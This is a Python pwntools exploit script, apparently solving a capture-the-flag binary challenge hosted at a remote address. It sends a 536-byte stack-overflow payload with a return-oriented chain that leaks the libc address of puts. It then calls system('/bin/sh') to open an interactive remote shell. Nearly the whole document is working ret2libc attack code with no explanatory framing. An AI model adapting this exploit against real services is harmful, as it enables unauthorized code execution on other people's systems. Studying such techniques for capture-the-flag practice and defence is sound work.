from pwn import *

r = remote("overly.uniquename.xyz", 2052)
# r = process("./challenge")
# gdb.attach(r)

main = 0x0000000000401293
pop_rdi_ret = 0x0000000000401313
ret = 0x000000000040101a
puts_got = 0x404020
puts_plt = 0x4010a0
puts_offset = 0x00000000000875a0
# puts_offset = 0x0000000000080aa0
system_offset = 0x0000000000055410
# system_offset = 0x000000000004f550
binsh = 0x1b75aa

print(r.recvuntil("ser:"))

payload = "A"*536 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
r.sendline(payload)
leak = r.recvuntil("Enter")
print(leak)
leak = u64(leak[-12:-6]+"\x00\x00")
print(hex(leak))
print(r.recvuntil("ser:"))
payload1 = "A"*536 + p64(ret) + p64(pop_rdi_ret) + p64(leak-puts_offset+binsh) + p64(leak-puts_offset+system_offset)
r.sendline(payload1)
r.interactive()

# print(payload)